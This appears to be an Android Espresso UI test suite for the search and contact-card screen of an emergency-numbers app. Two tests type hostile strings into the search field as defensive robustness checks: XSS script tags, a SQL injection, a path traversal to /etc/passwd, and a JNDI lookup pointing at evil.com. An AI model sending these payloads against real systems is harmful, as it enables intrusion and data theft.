package com.ly2xxx.sos;

import static androidx.test.espresso.Espresso.onView;
import static androidx.test.espresso.action.ViewActions.click;
import static androidx.test.espresso.action.ViewActions.typeText;
import static androidx.test.espresso.action.ViewActions.clearText;
import static androidx.test.espresso.action.ViewActions.closeSoftKeyboard;
import static androidx.test.espresso.assertion.ViewAssertions.matches;
import static androidx.test.espresso.contrib.RecyclerViewActions.actionOnItemAtPosition;
import static androidx.test.espresso.contrib.RecyclerViewActions.scrollToPosition;
import static androidx.test.espresso.matcher.ViewMatchers.hasDescendant;
import static androidx.test.espresso.matcher.ViewMatchers.isDisplayed;
import static androidx.test.espresso.matcher.ViewMatchers.withId;
import static androidx.test.espresso.matcher.ViewMatchers.withText;
import static org.hamcrest.Matchers.allOf;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.not;

import android.content.Context;
import android.content.Intent;

import androidx.test.core.app.ActivityScenario;
import androidx.test.core.app.ApplicationProvider;
import androidx.test.espresso.contrib.RecyclerViewActions;
import androidx.test.ext.junit.rules.ActivityScenarioRule;
import androidx.test.ext.junit.runners.AndroidJUnit4;
import androidx.test.filters.LargeTest;

import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.runner.RunWith;

@RunWith(AndroidJUnit4.class)
@LargeTest
public class EmergencyContactsActivityUITest {

    @Rule
    public ActivityScenarioRule<EmergencyContactsActivity> activityRule = 
            new ActivityScenarioRule<>(EmergencyContactsActivity.class);

    private Context context;

    @Before
    public void setUp() {
        context = ApplicationProvider.getApplicationContext();
    }

    @After
    public void tearDown() {
        // Clean up if needed
    }

    @Test
    public void testActivityLaunch() {
        // Verify that main UI elements are displayed
        onView(withId(R.id.toolbar)).check(matches(isDisplayed()));
        onView(withId(R.id.search_edit_text)).check(matches(isDisplayed()));
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
    }

    @Test
    public void testToolbarTitle() {
        // Verify toolbar title is set correctly
        onView(withText("Emergency Contacts")).check(matches(isDisplayed()));
    }

    @Test
    public void testSearchFunctionality() {
        // Test search functionality
        onView(withId(R.id.search_edit_text))
                .perform(typeText("United"), closeSoftKeyboard());

        // Verify that search results are filtered
        // Should show countries containing "United"
        onView(withId(R.id.recycler_view))
                .check(matches(isDisplayed()));
        
        // Clear search
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }

    @Test
    public void testSearchWithValidCountry() {
        // Search for a specific country
        onView(withId(R.id.search_edit_text))
                .perform(typeText("Germany"), closeSoftKeyboard());

        // Wait a bit for filtering
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        // Verify Germany appears in results
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withText(containsString("Germany")))));
    }

    @Test
    public void testSearchWithInvalidInput() {
        // Test search with special characters (should be sanitized)
        onView(withId(R.id.search_edit_text))
                .perform(typeText("<script>alert('xss')</script>"), closeSoftKeyboard());

        // App should not crash and should handle input safely
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        
        // Clear malicious input
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }

    @Test
    public void testSearchCaseInsensitive() {
        // Test case insensitive search
        onView(withId(R.id.search_edit_text))
                .perform(typeText("UNITED"), closeSoftKeyboard());

        // Should still find "United States" and "United Kingdom"
        onView(withId(R.id.recycler_view))
                .check(matches(isDisplayed()));

        onView(withId(R.id.search_edit_text))
                .perform(clearText(), typeText("united"), closeSoftKeyboard());

        // Should still work with lowercase
        onView(withId(R.id.recycler_view))
                .check(matches(isDisplayed()));
    }

    @Test
    public void testRecyclerViewItemsDisplayed() {
        // Verify that RecyclerView contains items
        onView(withId(R.id.recycler_view))
                .check(matches(isDisplayed()));

        // Scroll to different positions to ensure items are properly loaded
        onView(withId(R.id.recycler_view))
                .perform(scrollToPosition(0));

        onView(withId(R.id.recycler_view))
                .perform(scrollToPosition(5));
    }

    @Test
    public void testEmergencyContactCardLayout() {
        // Verify that first item has the expected layout elements
        onView(withId(R.id.recycler_view))
                .perform(scrollToPosition(0));

        // Check that emergency contact cards contain required elements
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withId(R.id.tv_country_name))));
        
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withId(R.id.tv_police_number))));
        
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withId(R.id.tv_ambulance_number))));
        
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withId(R.id.tv_fire_number))));
        
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withId(R.id.tv_general_number))));
    }

    @Test
    public void testEmergencyNumbersDisplayFormat() {
        // Verify that emergency numbers are displayed with correct icons
        onView(withId(R.id.recycler_view))
                .perform(scrollToPosition(0));

        // Check that police number has police emoji
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withText(containsString("🚔")))));

        // Check that ambulance number has ambulance emoji  
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withText(containsString("🚑")))));

        // Check that fire number has fire emoji
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withText(containsString("🚒")))));

        // Check that general number has SOS emoji
        onView(withId(R.id.recycler_view))
                .check(matches(hasDescendant(withText(containsString("🆘")))));
    }

    @Test
    public void testLongSearchQuery() {
        // Test with very long search query (should be truncated)
        StringBuilder longQuery = new StringBuilder();
        for (int i = 0; i < 150; i++) {
            longQuery.append("a");
        }

        onView(withId(R.id.search_edit_text))
                .perform(typeText(longQuery.toString()), closeSoftKeyboard());

        // App should not crash with long input
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }

    @Test
    public void testEmptySearchResults() {
        // Search for something that doesn't exist
        onView(withId(R.id.search_edit_text))
                .perform(typeText("XYZCountryThatDoesNotExist"), closeSoftKeyboard());

        // RecyclerView should still be displayed but empty
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }

    @Test
    public void testBackButtonFunctionality() {
        // Test that back button in toolbar works
        onView(withId(android.R.id.home)).perform(click());
        // Activity should finish (hard to test directly with Espresso)
    }

    @Test
    public void testSearchClearAndRestore() {
        // Perform search
        onView(withId(R.id.search_edit_text))
                .perform(typeText("Germany"), closeSoftKeyboard());

        // Clear search
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());

        // All items should be restored
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
    }

    @Test
    public void testMaliciousSearchInputHandling() {
        String[] maliciousInputs = {
                "<script>alert('xss')</script>",
                "'; DROP TABLE countries; --",
                "../../../etc/passwd",
                "javascript:alert('xss')",
                "${jndi:ldap://evil.com/a}"
        };

        for (String maliciousInput : maliciousInputs) {
            onView(withId(R.id.search_edit_text))
                    .perform(clearText(), typeText(maliciousInput), closeSoftKeyboard());

            // App should not crash and should display safely
            onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        }

        // Clean up
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }

    @Test
    public void testRotationPersistence() {
        // Perform search
        onView(withId(R.id.search_edit_text))
                .perform(typeText("United"), closeSoftKeyboard());

        // Simulate rotation by recreating activity
        activityRule.getScenario().recreate();

        // Note: In a real test, search state might not persist after rotation
        // This would depend on implementation of onSaveInstanceState
        onView(withId(R.id.search_edit_text)).check(matches(isDisplayed()));
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
    }

    @Test
    public void testAccessibilityElements() {
        // Verify important accessibility elements are present
        onView(withId(R.id.search_edit_text)).check(matches(isDisplayed()));
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        onView(withId(R.id.toolbar)).check(matches(isDisplayed()));
    }

    @Test
    public void testSearchPerformance() {
        // Test rapid search input changes
        String[] quickSearches = {"A", "AB", "ABC", "ABCD", "ABCDE"};
        
        for (String search : quickSearches) {
            onView(withId(R.id.search_edit_text))
                    .perform(clearText(), typeText(search), closeSoftKeyboard());
            
            // Small delay to simulate user typing
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        // App should remain responsive
        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }

    @Test
    public void testSpecialCharactersInSearch() {
        // Test search with various special characters
        String[] specialSearches = {
                "Côte d'Ivoire",
                "São Tomé",
                "España",
                "中国",
                "العربية"
        };

        for (String search : specialSearches) {
            onView(withId(R.id.search_edit_text))
                    .perform(clearText(), typeText(search), closeSoftKeyboard());

            // App should handle international characters gracefully
            onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        }

        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }

    @Test
    public void testEmptyStateHandling() {
        // This test would be more relevant if we had an empty state view
        // For now, just verify the RecyclerView handles empty results gracefully
        onView(withId(R.id.search_edit_text))
                .perform(typeText("NonexistentCountryName12345"), closeSoftKeyboard());

        onView(withId(R.id.recycler_view)).check(matches(isDisplayed()));
        
        onView(withId(R.id.search_edit_text))
                .perform(clearText(), closeSoftKeyboard());
    }
}
